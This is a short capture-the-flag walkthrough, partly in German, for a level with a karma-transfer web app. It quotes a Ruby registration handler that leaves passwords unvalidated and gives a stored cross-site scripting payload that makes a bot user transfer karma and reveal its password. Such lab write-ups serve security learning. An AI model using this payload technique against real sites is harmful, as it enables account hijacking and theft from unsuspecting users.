LEVEL 04
========

params[:password] not escaped and checked
XSS vulnerability, user karma_fountain logs in every minute... use to
send yourself karma to see his password

    <script type='text/javascript'>$.ajax({ url: document.location +
    'transfer', type: 'POST', data: { to: 'a', amount: '100' }});</script>.

---

Interessant, dass sich der User karma_fountain jede Minute einloggt, oder? Außerdem ist es wohl ein lustiges Verhalten, dass das eigene Passwort dem Karma-Empfänger angezeigt wird...

    post '/register' do
          username = params[:username]
          password = params[:password]
          unless username && password
            die("Please specify both a username and a password.", :register)
          end

          unless username =~ /^\w+$/
            die("Invalid username. Usernames must match /^\w+$/", :register)
          end

          unless DB.conn[:users].where(:username => username).count == 0
            die("This username is already registered. Try another one.",
                :register)
          end

          DB.conn[:users].insert(
            :username => username,
            :password => password,
            :karma => STARTING_KARMA,
            :last_active => Time.now.utc
            )
          session[:user] = username
          redirect '/'
        end

Die interesse Stelle oben lässt erkennen, dass hier der Username durch eine Regular Expression validiert wird, dass Passwort jedoch nicht! Oh. Und das Passwort wird ja jedem Empfänger angezeigt?! Spricht für eine wunderbare Cross Site Scripting Vulnerability. 

    <script type='text/javascript'>$.ajax({ url: document.location +
    'transfer', type: 'POST', data: { to: 'a', amount: '100' }});</script>
    
Packen wir also das kurze, oben stehende Script bei der Registrierung als Passwort in unseren Account und überweisen der karma_fountain danach etwas Karma, so wird beim nächsten Aufruf durch die karma_fountain eben jenes Script ausgeführt. Das Teil sendet also dem User a Karma - und natürlich das Passwort! 